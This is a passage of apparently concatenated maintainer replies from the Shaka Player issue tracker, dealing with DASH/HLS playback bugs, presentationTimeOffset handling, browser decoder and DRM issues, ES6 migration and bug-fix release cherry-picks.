startup, in case you haven't done this yet in your fork.\n\"Fix HLS playback where moof box is larger than 1k\": 88857c59aacb8ac0dbc6f9b6eaea683f08f7a17b\nThis shows a new feature we added to the MP4 parser so that you can parse buffers which contain partial MP4 boxes.\nDoes your work on this so far include WebM?  Or just MP4?\nAre you interested in sending a pull request?. We don't support PNG at this time, and this would require a redesign of our Cue interface.  See https://github.com/google/shaka-player/issues/1080#issuecomment-339741268 and the other comments in #1080 for deeper discussion on redesign.\nFor now, I will put this in the backlog along with the other TTML enhancement issue.  If you would like to propose change to Cue, please do.  I would strongly prefer to agree on a design for Cue before work is started on a PR, but a PR is still welcome if you want to contribute.. I don't see any technical reason for it, nor any historical one.  It has been that way since AbrManager was introduced for v2, and stop() has never returned a Promise.\nTo explain what that does, you can pass non-Promise values to a Promise.all, and the effect is as if it was a Promise resolved with that value.  For example:\n```js\nvar p0 = Promise.resolve(0);\nvar p11 = 11;\nvar p22 = new Promise(function(resolve) {\n  setTimeout(function() { resolve(22); }, 2000);\n});\nPromise.all([ p0, p11, p22 ]).then(function(values) {\n  console.log('VALUES', values);\n  console.assert(values.length == 3);\n  for (var i = 0; i < values.length; ++i) {\n    console.assert(values[i] == i * 11);\n  }\n});\n```\nSo in this way, Player can shut everything down without caring whether each method returns a Promise or not.  But there's no reason we couldn't have just done this before the Promise.all:\njs\nif (this.abrManager_) this.abrManager_.stop();. So to go back to the original question, \"should stop() return a Promise?\"\nIn terms of the shutdown code, it doesn't matter from Player's point of view.\nIf your custom AbrManager needs to do anything asynchronous to shut down, then we can change it to return a Promise.  Otherwise, there's not much point.\nAnother historical note that may explain why it doesn't return a Promise already:\nAbrManager is an external interface, but IDestroyable is not.  IDestroyable is used inside the core of Shaka, and IDestroyable mandates that destroy() return a Promise.  For some of our internals, async destroy() is necessary.  But since AbrManager is a plugin interface with a stop method instead of an internal class implementing IDestroyable, there's no requirement for it to return a Promise.\nDoes that answer your question?. No worries.  If anybody needs async shutdown, it's a backward compatible change to make that return a Promise in future (thanks to the Promise.all behavior described above).. I have reproduced your issue with the test page you sent, as well as in our demo app.  The Shaka Player error codes 3014 and 3016 tend to indicate decoder errors.  The MS-specific error code (c00d3e98) seems to indicate a decoder failure as well.\nI have not analyzed the content itself, but this could be a regression in Microsoft's decoders.  I'm not sure what you can do to debug further in Edge.  I suggest you file a bug with Microsoft here: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/\nIf you file a bug with MS and share the bug link with me, I can forward it to some folks at Microsoft who may be able to help you further.. Someone from Microsoft just informed me that the error code c00d3e98 is a media error about an unsupported format.  You should definitely file a bug with Edge and link back to it here so we can help get it to the attention of the right people.. Our friends at Microsoft reproduced the bug with your test page, and have filed an internal bug on this, reference ID 14554354.  Hope that helps!. Not that I have been able to find.  But if you file a bug of your own, you can reference that in the report, so that Microsoft can link the two together.  Through your own filing, you may be able to get status updates from them when they solve the issue.. I don't know the cause.  I'll ask my contact at Microsoft for more details so that we can understand what an effective workaround would be.. Interesting.  You can control that clear lead in Shaka Packager.  Are you willing to re-package some content to test that theory?  Try with --clear_lead 0 if you're using the command-line packager.  (The default is 10s.). @leejonghyeon0106, since the issue is in Edge/IE/Windows, there's nothing Shaka Player can do to fix it.  Please leave a comment on the external bug report and ask Microsoft for solutions/workarounds: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12658991/. The latest copy of Edge I have is Edge/16.16299, on which I can still reproduce the error.. The external issue is still in an open state: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12658991/. Wikipedia says that Edge 17 came out April 30, but we still don't have that update in our lab.  We have done a round of updates since then, so I'm not sure what's going on yet.\nI will keep tabs on it, and let everyone know when we finally see Edge 17 show up.. We have others reporting that this has been fixed in the latest release of Edge.  Please update!. I can't reproduce with our nightly build or the v2.2.5 official release:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/shaka-demo-assets/angel-one-widevine/dash.mpd;license=https://www.random_address.com/license;lang=en-US\nhttps://v2-2-5-dot-shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/shaka-demo-assets/angel-one-widevine/dash.mpd;license=https://www.random_address.com/license;lang=en-US\nIn both cases, the first video stops after the clear lead.  If I select another video from the list and click \"Load\", it loads.\nI am also unable to reproduce in your demo app: https://urm.latens.com/boomplayer/demo/\nI am running the same Chrome and Widevine versions as you.. I've been using Linux, but I will go retest on Windows and Mac.. Confirmed on Mac.  It definitely appears to be caused by https://crbug.com/690583, because the closed Promise on the session is never resolved.  I will try to escalate the issue with Chrome team.. The bug in Chrome is still not fixed, but the workaround by @chrisfillmore will appear in the v2.2.8 bug fix release of Shaka Player.  Thanks!. At the very least, we need to know that the content will be protected.  If the manifest doesn't have any clues to tell us encrypted content is expected, we won't set up EME.\nHere's a possible solution that seems simple from my perspective: put ContentProtection elements in the ad periods, even though they aren't encrypted.  It won't hurt anything to have them there, and that is an existing signalling mechanism that the Player recognizes.\nWould that work for you?. I'm not sure how other players or DAI providers handle this.\nPart of our design for v2 has been that you can provide a complete DRM configuration without needing to care which providers are available for which platform, or even which pieces of content are encrypted.  If you provide DRM configuration and play a piece of clear content, we will ignore that DRM configuration.  So if you provide DRM configuration for, say, Widevine & PlayReady, you should still be able to play clear content on a browser with neither.\nIf we change that, and we set up DRM any time license servers are provided, DRM becomes required by that configuration, even for clear content.  But if you provide license servers in your application, you are probably expecting DRM content at some point, either in some other manifest or some future period of this one.  So it shouldn't be a big risk for developers if we change this.\nI'm marking this as an enhancement, renaming, and scheduling tentatively for v2.4.  In the mean time, if you want to make appropriate changes in your fork of Shaka Player or send us a pull request, we are always happy to have contributions from the community.. @chrisfillmore, I'm not sure.\nBut the underlying request is to expect DRM content when there is a DRM configuration provided, and I think I'm okay with that.  We could be more selective and make this change in behavior conditional on live or dynamic content, since everything should be known upfront about static/VOD content.\nAnother option is to add a configuration to allow apps to say \"expect DRM content at some point\".. Cherry-picked to v2.3.1.. We could share the aggregate results from the multiple choice questions, but I wouldn't want to share email addresses, company names, or any of the comments left in the open comment sections.  We never explicitly asked in the survey if that information could be shared, and we want people to feel free to speak their minds when giving us direct feedback.. Just a quick reminder (to anyone subscribed to github activity) that we are seeking your feedback.  Please take our survey and help us decide what features and platforms to prioritize in Shaka Player:\nhttps://docs.google.com/forms/d/e/1FAIpQLSfCAjWTmMtXeS4CL3n2v-oVzL5yaXJdEttc5RhZFAq2j02yfw/viewform?usp=sf_link\nThe survey will be open until December 1, 2017.\nThanks!. The survey is now closed.  I'll post aggregate results here some time next week.. Here are the results of the survey:  Shaka Player 2017 Q4 Survey Report.pdf\nPlease let us know if you have any questions.  Thanks!. Hi Sanders,\nThanks for the feedback.  I'm not sure what you mean about colors and weights.\nFeature responses are assigned the same colors across charts.  So, for example, \"very important\" is blue in all pie charts, \"important\" is red, \"nice to have\" is orange, \"not important\" is green.  (I did not put any thought into the color assignments.  These are the default colors in Google Sheets, and I simply made sure the answers were in the same order across charts.)\nHow would you expect the colors to be chosen for the pie charts?. @tjber, when #1099 is fixed (soon), you should try again with the presentationTimeOffset field set with respect to timescale.  Please follow along on #1099.  Sorry for the confusion.. If you are still having issues after #1099 is fixed, we can reopen this issue and try again.  Thanks!. The fix for #1099 has been pushed to the master branch.. If your goal is to limit what's played by skipping the first, say, 2.1 seconds, you should try the playRangeStart configuration instead of modifying the manifest:\nhttps://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#PlayerConfiguration\njs\nplayer.configure({\n  playRangeStart: 2.1\n});\nDoes this help?. Okay, I think I see what's going on now.  We are using presentationTimeOffset in the second Period, but the content is being offset back into the previous Period's time range and overwriting content starting at time 11.  Period 1's duration is 13.12, PTO for period 2 is -2.12, so the content starts appearing at 11.. I hope that unblocks you.\nIn the mean time, though, there does seem to be a bug on our side.  We should be instructing MediaSource to throw out any content that hangs off the beginning of the Period, and we are not.\nWhen I start adding that to our code, I still see some strange behavior, and I'm not sure if it's a Chrome bug or a Shaka bug.  Still working to track that down.. I've put together a non-Shaka demo that shows MediaSource doing the right thing with this keyframe-only content, so any issues I'm having are issues with Shaka Player.\n1098.zip\n. I've noticed two things that are wrong with your demo content:\n\nI think the second period presentationTimeOffset should be 312, not 212\nThe timescale in the manifest does not match the timescale in the media, which is throwing off our SIDX parser\n\nI will need to consult with the DASH spec and IOP to understand whether or not the timescales are supposed to match.  If so, the content is wrong.  If not, the player is wrong.. The DASH spec says of timescale:\n\nNOTE: This may be any frequency but typically is the media clock frequency of one of the media streams (or a positive integer multiple thereof).\n\nSo we should not assume that it matches the timescale of the container.. With the following changes, I have your all-keyframes content working as I think it is intended:\n\nEdit the manifest to set presentationTimeOffset in second period to 312 instead of 212\nUse appendWindowStart in MediaSource to avoid replacing period 1 media with period 2 media\nFix segment index parsers such that they do not assume a consistent timescale between media & manifest\n\nYou can expect fixes for 2 & 3 to be published in the near future.. I updated the nightly build with the fixes for this.  You can now see a demo of your content here:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/_bugs/1098-fixed/dash_allkeyframes.mpd;lang=en-US;play\nIs this what you were going for?. We are always happy to help.  It took some time to understand what was happening, but it turned out to be an important bug.  So thank you for the report!. Fixes cherry-picked to v2.2.6.. A brief review of DASH parser from v1 makes me think we didn't have this bug in v1.\nIn v2 (all versions), we seem to parse SegmentTemplate and SegmentTimeline correctly and divide by timescale, but not SegmentBase.  So the damage is limited to SegmentBase's presentationTimeOffset, but the bug seems to be present in every single v2 release, all the way back to v2.0.0-beta.. The fix has been cherry-picked for v2.2.5 and v2.1.9.. Repro URL from original comment: https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://cdn.demo.anevia.com/live/nas40/Arte/mirada_test/Arte.m3u8;lang=es. With some local hacks to adjust MediaSource SourceBuffer offsets to compensate for the bad output from mux.js, I can play the above stream.  I need to raise the issue with mux.js to see if there is a way we should be configuring it to give us unmodified timestamps.. Filed videojs/mux.js#168 to get support from mux.js.. We have a work-around now.  I'm asking mux.js folks for a configuration for this to make it a little easier, but we can move forward in the mean time.. Based on your description and the conversation on the Chrome bug tracker, it seems that this is an issue with the VP9 hardware decoder on Windows, or with the way Chrome is interfacing with it.  So I'm going to treat this as an external issue.\nI left some comments on the Chrome bug speculating on how Shaka Player and dash.js might do things differently to trigger this bug, and suggested ways we could instrument things for more consistent repro.\nThanks for engaging with Chrome team!. The external bug is marked as fixed in Chrome 65, and I just confirmed the fix in our lab.. I'm getting CORS errors with the link you sent.  Can you retest this content in the latest nightly build, or allow cross-origin access for us to test?. @avelad, I'm now able to access the main playlist, but I'm getting a 404 for one of the media playlists (TTML_fra).. @avelad, there's no rush.  We didn't mean to disturb your vacation.  Just trying to provide updates.  Please take your time getting back to us.. With https://cdn.demo.anevia.com/live/eds/dvb_txt/HLS-MP4/dvb_txt.m3u8 I get Shaka Error TEXT.UNABLE_TO_EXTRACT_CUE_START_TIME.. This seems to be caused by the style block in your VTT files.  Our WebVTT parser is failing on that.  It should be easy to fix.. The fix has been cherry-picked for v2.2.8.. @radiantmediaplayer, thanks for the info!  It may not be drift at all.  It could be a regression.  I'll look into it.. Looks like this change broke it: https://github.com/google/shaka-player/commit/dcb382ecc2fc8893c2e3c80a7839bd1c90b07dc7. Ah, it's more subtle than that.  The change that \"broke\" it was a good one, but it has exposed something else.\nWith that change reverted, the stream starts up at the left-hand-side of the seek range, which is wrong.  We should start at the right-hand-side, the end of the seek range, at the live edge, but that isn't available.\nSo this may be drift, even though it was \"working\" in v2.2.3, because v2.2.3 was broken in a way that covers up this drift issue.. The stream has drifted.  The latest available segment is about 25s before the live edge.  When you add that to the presentation delay of 30s, and we've drifted a total of 55s since the stream was started about 33 days ago.\nBut there is some other issue at work, too.  For a stream which is drifting, you'd expect it to start playing eventually, once the playhead had fallen back into a range which was available.  In this case, around -25s from the live edge.  That isn't happening.  The logs from StreamingEngine show that the timestamps it is trying to load don't change if you seek, so StreamingEngine may be stuck somehow on that unavailable timestamp.  I need to investigate more.. On a live stream in this failing state, shaka.media.Playhead.prototype.getStartTime_ continues to move forward, and this is what StreamingEngine uses to decide what to stream next when nothing is buffered yet.  So the actual video element playhead is not being used, which is why neither seeking nor waiting resolves the issue.. Fix cherry-picked for v2.2.7.. @avelad, please take a look at this.  We want to make partial segment requests to determine the start time of each HLS playlist, but the content you linked to in #1102 (https://cdn.demo.anevia.com/live/nas40/Arte/mirada_test/Arte.m3u8) resides on a server which doesn't permit this.  We can work around it by falling back to full segments, but the fallback is expensive.  It will cost you a lot of time and bandwidth on startup of the stream if we can't fetch partial segments.\nWe will issue a warning about this in the console, but I wanted to bring it to your attention explicitly, in case you want to look into changes on your servers.\nThe specific issue is that a cross-origin range request results in a preflight request, but your servers return HTTP 405 because they don't support preflight.  Here's a doc about preflight: https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request. Excellent, thanks!. Is there any guidance in the DASH spec or IOP on signalling key rotation?  If so, we can use that signal to make sure we listen for media PSSHs.\nOtherwise, there's no clear way for us to do what you're asking and still do the right thing on VOD content.. This could be related to this Chrome bug: https://bugs.chromium.org/p/chromium/issues/detail?id=398141\nI'm going to test in Chrome beta (63) with and without the --enable-features=MseBufferByPts flag, to see:\n\nIf it has been fixed already in Chrome beta\nIf it is fixed specifically by the MseBufferByPts experiment. Reproduced in Chrome 62, ChromeOS, no special flags.  Still need to investigate with Chrome 63 and flags.. This has been fixed by Chrome 63 and the MseBufferByPts flag.  It still fails in Chrome 63 without the flag. \n I will bring this to the attention of the Chrome devs who are working on that feature/flag.. I believe the Chrome DTS/PTS bug has now been fixed, so I'm closing this bug. If you still have issues with the latest stable release of Chrome, please file a new issue. Thanks!. Using the content you sent in #1108, with the same Chrome version and flags that allowed it to play back, I see that the content fails to play into the second period.  This is due to the presentationTimeOffset field in your second Period, which, based on my analysis, should be zero.\n\nThe media timestamps in the mp4 segmenst in period 2 start at DTS 0, so there is no need for a presentationTimeOffset in the second period.  The effect of presentationTimeOffset (PTO) is this:\npresentation time in MediaSource buffer = media timestamp + period start time - PTO\nSince the media timestamps start at 0, PTO should also be 0 to align the content to the start of the period.. Using the content you sent in #1108, with the same Chrome version and flags that allowed it to play back, I see that the content fails to play into the second period. This is due to the presentationTimeOffset field in your second Period, which, based on my analysis, should be zero.\nThe media timestamps in the mp4 segmenst in period 2 start at DTS 0, so there is no need for a presentationTimeOffset in the second period. The effect of presentationTimeOffset (PTO) is this:\npresentation time in MediaSource buffer = media timestamp + period start time - PTO\nSince the media timestamps start at 0, PTO should also be 0 to align the content to the start of the period.. Broken in 20c60e65caaefd3bdcc82fa94c43ecbd82c69350 (#883) and present in all releases since v2.2.3.. Fix cherry-picked for v2.2.8.. In this piece of content, the first period media starts at DTS & PTS of 0.  Your presentationTimeOffset field for that period is set to 2842, with timescale 1000.  The effect of presentationTimeOffset (PTO) is:\npresentation time in MediaSource buffer = media timestamp + period start time - PTO\nSo the media timestamps are adjusted back to -2.842 seconds.  The MediaSource spec states that anything before 0 is chopped off, and that removal proceeds up to the next keyframe.\nshakaDemo.localPlayer_.getBufferedInfo() shows that the buffered range starts at 3.164 seconds, which corresponds to media timestamp of 3.164 + 2.842 = 6.006 seconds, which is indeed the first keyframe after 2.842 seconds.. CC @kqyang for resolution\n@WhiteDove101, we do not currently support iOS browsers due to the lack of MediaSource API (a critical API we need in the browser to do adaptive playback).\nI'm closing this as a duplicate of #997, in which we are making plans to support iOS in a limited capacity through Apple's native HLS implementation.  The most we would be able to do on iOS is pass the HLS manifest URL down to Apple and let them play it back for us, so this would prevent Shaka Player from having any control over buffering, networking, etc.\nIn the mean time, you can use Apple's HLS implementation directly on iOS browsers:\njs\nvideo.src=\"/path/to/foo.m3u8\";\nvideo.play();\nWhat we will provide in future as part of #997 will be no more than a convenient wrapper around that.. The demo app does its own autoplay at the app level, because the autoplay attribute on the video element doesn't work on Android.  Take a look at demo/asset_section.js, the bottom of shakaDemo.load(), which says:\njs\n  // While the manifest is being loaded in parallel, go ahead and ask the video\n  // to play.  This can help with autoplay on Android, since Android requires\n  // user interaction to play a video and this function is called from a click\n  // event.  This seems to work only because Shaka Player has already created a\n  // MediaSource object and set video.src.\n  shakaDemo.video_.play();\nIf you create your own application and don't call video.play(), you will find that the autoplay attribute does what you would expect (except on Android, where it is often ignored).. Where is this checkbox?  I don't see it in Chrome on Linux.\nIf this is a thing users can toggle outside of our demo UI, we could make the play() call dependent on the state of video.autoplay.  It would be simple and might remove a source of surprise for users of the demo app.\nI just want to find where that checkbox is so I can reproduce.. I didn't see it any checkbox in Firefox on Linux, either.  What browser & OS are you using, and where does the autoplay checkbox appear?. Ah!  I see!\nHere's the source of confusion:\nHTMLMediaElements have an autoplay attribute which has the effect of calling play() when a source is loaded.  If this attribute is set, most platforms (not always on Android) will start playing the video as soon as you call player.load().  I was looking for a checkbox for that provided by the browser, similar to the one you get for the \"loop\" attribute when you right-click a video element.\nThat checkbox in configuration is something else.  It has the effect of automating the \"Load\" button when you refresh the page.  It's useful for manual testing and debugging, when you need to edit some code and reload the page to quickly reproduce an issue.  It's also useful in bug reports, so that bugs reproduce when the page loads.\nThe checkbox you're referring to should not be named \"Autoplay\", to avoid confusion.  Instead, we should call it something closer to what it does: \"Load content on page load\".\nDoes that makes sense?  If that explanation helps, we will go ahead with renaming the checkbox in the demo UI.. Excellent.  Thanks for the feedback!. The name change has been cherry-picked to v2.2.6.. Definitely seems like a bug.  Any core (required) components related to text should be in the \"core\" list of sources, not \"text\".. Fix cherry-picked to v2.2.6.. This may be related to #1105.  I have a fix for that in review now, so I will check the fix against this stream, as well.. Actually, this seems to be unrelated to #1105.\nWhat I see in a manifest I just fetched is:\navailabilityStartTime=\"2017-11-22T20:14:27.659Z\"\nfetch time 2017-11-22 20:21:56 UTC\nTime since AST = 7 minutes 29 seconds\ntimeShiftBufferDepth=\"PT30S\"\nOldest segment time = 14214923537, timescale 90000 = 157943.6 seconds = 43 hours, 52 minutes, 23 seconds\npresentation time offset = 0\nSo there are no segments within the availability window (7:15 to 7:30).  All segments are way past the end of the window.. I'm sure it is, but that doesn't mean the content is correctly described in the manifest.\nIf we ignored availabilityStartTime, we would be able to play this.  But the manifest is not self-consistent, and this is not something we are going to support at this time.\nAfter #999, we would no longer rely on availabilityStartTime, which would enable us not only to better deal with drift, but to play broken content such as this.\nBecause the segment descriptions do not agree with the rest of the manifest, this is broken content, and the encoder/packager that created it should be fixed.. Reopening to track that external issue.  We will close when Microsoft releases a fix.  Thanks!. It was intended that the streaming event allow changes to be made before the player starts streaming anything.  What you tried to do, @kocoten1992, should have worked.\nThe buggy part of the system in this case is a little challenging to modify, so I am going to schedule the work for v2.4 right now.\nIn the mean time, waiting for load() to complete is one possible workaround.  It doesn't get you the timing you wanted, though.\nAnother workaround is to use the streaming event to configure the restrictions object, which can restrict the system to one particular track.  This is how we imagined the event being used, and this should work.\nBut we will look into fixing selectVariantTrack during streaming event.. I have a working fix locally.  I need to write regression tests and clean everything up for review, but I expect to be able to put this into a v2.3.x bug fix release.. This turned out to be several bugs layered on top of each other.\nFirst, we would fire the \"streaming\" event too early, before our final stage of filtering.  This meant that for multicodec content, you might be selecting a track which will be subsequently filtered out.  If the track was no longer available after filtering, we would effectively ignore your selection.  This bug would only be triggered by multicodec content (VP9 & H.264, for example).\nSecond, there was a code path in which we could ignore your track selection.  This was very easy to trigger with the \"streaming\" event, and in an uncompiled build, would result in a failed assertion.\nThird, once the second bug was fixed, we could fail some assertions in StreamingEngine and still effectively ignore your track selection.. Cherry-picked for v2.3.3.. Closing as a duplicate of #1105. Yes, I'm sure it will.  We have identified the cause and will have a fix out in the near future.. The fix has been cherry-picked for v2.2.7.. @mimse, did we answer your question?  Is there anything else we can do for you on this?. Fix cherry-picked for v2.3.2.. Cherry-picked for v2.2.7.  Thanks!. @dlevinson5, as a note for next time, it is very difficult for us to fix bugs if you don't provide us with a means or reproducing them.  A manifest URI is generally required for us to reproduce an issue that involves that specific content.  You can share URIs with the team privately at shaka-player-issues@google.com (as mentioned in the issue template).  If you can reproduce your issue with the content in our demo app, you can just tell us the name of the clip you used, and avoid the need to send us private content.\nIn this case, though, we just pushed a new release to appspot this morning, and people sometimes report strange issues in the first hour or so after a push.  So this could be a simple caching issue.  Can you please try clearing your browser cache and then try playback again?. Can you provide an example of such a stream?. @Levin-Li, could you provide an example of the sort of stream you're talking about?. Closing due to inactivity.  @Levin-Li, please let us know if you have sample content, and we can reopen and take a look.. In your sample code, I noticed that it looks like an important line is commented out:\njs\n// var video_ = castProxy_.getVideo();\n    if(video_.paused){\n      video_.play();\n    }else{\n      video_.pause();\n    }\nIf video_ isn't the proxied video, is it the local video element?. Ah, okay.  Thanks for the clarification.. The bug was in Player and triggered only on the receiver side.  We have fixed this in the master branch, and the fix will be released in v2.2.7.  We will close this issue as soon as the receiver has been updated as part of the v2.2.7 push.. Fix cherry-picked for v2.2.7.. The receiver URL has been updated.  I don't know how long it takes for that to propagate to Chromecast devices.  My guess is that you should be able to verify the fix in a few hours.  Thanks!. All fixes for this have been cherry-picked for v2.2.9.. It sounds like you have an issue with CAF, but everything is working in Shaka Player.  Is that correct?\nI don't know what version of Shaka Player is built into CAF.  You will have to ask the Cast team for support on that.\nError 3016 indicates a decoder error, which comes from the Chromecast platform in this case.  If you want to go deeper, you'll need to the Cast team for support.\nI'm sorry we weren't able to help you with CAF directly, but if you file a bug with the Cast team, please link to that bug here so that people who run across this issue will be able to follow along to the resolution.\nDoes this help?. @pszemus, if you can link us to a public support discussion so we can understand what went wrong, that would be great.  If not, could you provide some update here once this is resolved with Wowza?  That way future Shaka Player users will have a hint about what it took to resolve this issue.  Thanks!. Thanks!. @chrisfillmore, have we answered your question?  Is there anything else we can do for you on this?. I'm not sure why it's OS-specific.  We (Shaka Player team) aren't in control of the browser or CDM implementations, but you may be able to contact Widevine support for that.. Starting in Chrome 62, the Widevine CDM sends a certificate request message that was not always sent in earlier versions.  Your proxy needs to forward this to the Widevine license server.  It sounds like this is a bug in your proxy.. Also, this would seem to explain why it doesn't happen on Linux.  The certificate feature introduced in Chrome 62 may not have been implemented on Linux.. Cherry-picked for v2.2.7.  Thanks!. The encrypted version is failing, too.  I'm looking into it.. The encrypted version fails because we aren't fetching enough of the segments to find the tfdt box and extract the timestamp.\nThe clear version fails because the text stream starts at 0 and the video & audio streams start at 8+change, so the HLS parser sets presentationTimeOffset to 0.. Fix cherry-picked for v2.2.7.. Fix cherry-picked for v2.2.8.. Cherry-picked for v2.2.7.  Thanks!. @TheJohnBowers, can we close this issue now that you added some multi-DRM VDMS assets back in November?  Thanks!. @danmo, is this still an issue for you?  If so, can you provide a way for us to reproduce the issue?. Okay.  Thanks for the update!. @korhan0508, we are unable to reproduce.  We expect that you need to update npm.  If this does not work for you, please let us know and we can reopen the issue and help you further.  Thanks!. Fix cherry-picked for v2.2.7.. We should retest this once v2.2.7 is out.  We have fixed a few issues lately that might be related: #1105, #1150.  When those fixes are in the demo receiver, we should see if those fixes help at all.. Fix cherry-picked for v2.2.7.. Any time there are mouseovers which cause layout changes, it will always be possible for a resize to trigger scrollbars, which changes layout, which changes the element under the mouse, which triggers a resize, and so on.\nThe root of this issue, to me, seems to be that mousing over the video should change the layout of the demo page at all.  The visibility of the controls overlay should not change the size or position of anything.. Obsoleted by the new UI.. @buggles333, please let us know if an updated Shaka Packager fixes it for you.. @kqyang, can you provide an up-to-date binary of the packager for Windows?  Or should we wait for the next release?. We do compile the demo app now (in master branch).  It's a recent change that isn't in the v2.2.x releases.. The trouble with this is that clearing media ahead of the playhead causes stuttering issues on some browsers.  That is why we don't stopped doing that in v2.\nHave you tested this on multiple browsers?  Which browsers does your application intend to support?. Thank you for doing such detailed testing.  At this point, our plates are pretty full for the rest of the year to finish v2.3.0.  We will look into this PR in January when we start work on v2.4.0.  Please accept our apologies for the delay, and thank you for your contribution!. Changing the Representations is not allowed as far as I know.  At least, doing so would come with serious compatibility and interoperability issues.\nIn general, we do not support DASH content that goes far afield of the DASH Interoperability Points (IOP).. Happy to help!. Cherry-picked for v2.2.7.  Thanks!. We could move to ES6 without dropping IE11 support, by changing the way we develop.  Uncompiled mode is the issue.  In uncompiled mode, ES6 code won't run on IE11.  If we are compiling ES6 down to ES5, we can still develop in ES6 and run compiled ES5 on IE11.. This will be a long transition.  In particular, replacing the linter will be a giant pain.\nChecklist for ES6 conversion:\n - [x] Use Babel to serve ES5 in unit tests, so we can still test uncompiled code on IE11\n - [x] Disallow uncompiled build in the demo app on IE11\n - [x] Allow ES6 input in the compiler settings\n - [x] Replace the long-deprecated gjslint with modern JS linters that understand ES6\n   - [ ] Refine linter settings and convert code to pass\n   - [ ] Reimplement property doc enforcement for typedefs (in jsdoc fork?  as eslint plugin?)\n - [ ] Start converting library code to ES6 syntax\n - [ ] Polyfill some ES6 methods and lift some of the bans in build/conformance.textproto\n . ES6 work and linter changes cherry-picked to v2.3.1 to make it easier to cherry-pick bug fixes from after these ES6 changes.. Until https://github.com/google/closure-compiler/issues/893 is resolved, we can't use ES6 syntax in our externs.. ES6 is now possible in externs!  If it doesn't work right away, we may need a compiler update.. Our demo is cacheable for 1 hour.  Right after a deployment, this sometimes causes issues.  Please clear your browser cache and try again.. Glad it's working.  Sorry for the trouble!. That definitely sounds like a bug, and your suggested fix makes sense.  We will try to reproduce the issue and then try your suggestion.  Thanks!. Confirmed the bug.  It turns out that we already have a test for this, but it was being skipped because of a typo introduced in 892d1074336283c4f05c8b10b1555164345ee7a9.  So we lost test coverage about 6 months ago.  Still tracking down when we broke the feature itself.. It looks like the temporary licensing feature wasn't broken per se, but the check for init data with temporary licenses was always broken.\nIf there is no init data in the manifest, the only way we can create a session and request a license is by playing the content.  This is why init data is required for offline storage (with persistent licenses).  We have to get a persistent license without playing the content, so the init data must be available upfront.\nThis is not true for storage with temporary licenses.  In that scenario, there is no need for init data, because there is no need for a license at all.\nIn our existing temporary license storage test, we store content that has init data upfront, so we never triggered that error in testing.. The test that was accidentally disabled for 6 months is somewhat orthogonal to this issue.  Re-enabling the test triggered a test failure, but it was an unrelated test failure caused by flaky timing in the test itself.. Thanks!  That's kind of you to say.. The fix has been cherry-picked for v2.2.9.. Yes!  We have been archiving old releases almost since the beginning of the project.  A few releases ago, we introduced an index to make it easier for everyone to find them: https://index-dot-shaka-player-demo.appspot.com/\nThe index is automatically generated, so it will always be up-to-date.. We now have one integration test for CastReceiver, in which we delay various stages of load() to make sure the sender continues to get updates.  This helped catch and solve some runtime exceptions.\nWe will leave this open until we write some general integration tests for CastReceiver, unrelated to any known bug, along the lines of the playback tests we have in player_integration.js.  At that point, we will have reasonable general coverage, and can close this issue.  Regression tests can be added to cast_receiver_integration.js for future bugs.. Thanks for your contribution!  We need some more information from you on the issue before we can review this.. Presentation time offsets are already taken into account via TextEngine.  If you would, please send a URL so that we can reproduce the issue, and then we will be better able to understand the problem and review your PR.\nIf you don't want to post the URL publicly for any reason, you can share with the team privately by emailing the link to shaka-player-issues@google.com.\nThanks!. Sorry for the long delay.\nOne of your manifests had a typo, but it was easy enough to fix.  Those MPDs using our own test segments are very helpful.  Thanks!\nWe have reproduced the issue, but I suspect this use-case might conflict with another.  I still have some digging to do.. This seems to be specific to SegmentTemplate+duration.  I'm fairly sure the bug is in the DASH parser, but the fix is more challenging than I expected.. Several issues came up here.\nFirst, in your \"ABC\" test manifest, the text segments had a duration of 60 inside a period of duration 20.  This is an edge case we didn't handle correctly in the DASH parser, and it caused failures in StreamingEngine.\nSecond, the DASH parser didn't apply presentationTimeOffset correctly in the case of SegmentTemplate+duration.\nThird, the \"BAC\" test manifest had text segments with a duration of only 20 seconds, even though the media segment was actually 60.  This meant that after applying an offset of -20 or -40 seconds, everything went a little crazy.  I fixed the manifest for this.\nHere are the corrected versions of all three manifests, which I now have working locally:\nhttps://storage.googleapis.com/shaka-demo-assets/_bugs/1164/1period.mpd\nhttps://storage.googleapis.com/shaka-demo-assets/_bugs/1164/3periodsABC.mpd\nhttps://storage.googleapis.com/shaka-demo-assets/_bugs/1164/3periodsBAC.mpd. The fix is in the master branch now.  Please let us know if you have any questions!. The fix has been cherry-picked for v2.2.9.. @caldrix, we received your email with a manifest attached, but we need to have a manifest URL so that we can access the segments as well.  An MPD as an email attachment is not playable, so we cannot use it to reproduce and work on your issue.\nCan you please send us an accessible manifest URL?. @caldrix, we sent you IP addresses privately and we haven't heard back.  If you can't provide access to the content, we can't reproduce the bug.  If we can't reproduce the bug, we can't work on a fix.\nWe would love to help you, but we will need more information.. We received the manifest URI privately, and we will try to reproduce the issue.  Thank you!. We are unable to access the manifest at the URI you provided.  The connection to your server times out.\nIn your original report, you mentioned Shaka Player v2.2.6.  Can you try again with the latest release, v2.2.8?  https://v2-2-8-dot-shaka-player-demo.appspot.com/demo/\nWe have fixed many bugs since v2.2.6, including ones related to live streams, drift, and startup in v2.2.7.\nIf the issue is still present in v2.2.8, can you please try the nightly build?  https://nightly-dot-shaka-player-demo.appspot.com/demo/\nFinally, if all else fails, can you please try a few different versions from our index page?  https://index-dot-shaka-player-demo.appspot.com/  If you can find a version that did work, it would really help us narrow down our search.\nAlthough we can't access your content yet, these steps could help us track down the issue in the mean time.  Thanks!. @caldrix, we haven't heard back from you in the past month, so I'm going to close this issue due to inactivity.  If/when you have time to try different versions or provide us with direct access, I would be happy to reopen the issue.  Thanks!. I have seen in the past that browsers tend not to make more than 2 TCP connections per server domain.  (Haven't checked in a while, so this may not be true any longer.)  If your videos are all hosted in the same place, trying to load 4 at once may be a really bad idea.  If you have the bandwidth to sustain loading all 4 at once, you could work around this by using different subdomains (x1.foo.com/video1.mpd, x2.foo.com/video2.mpd) that all lead to the same place.\nBut I would recommend that 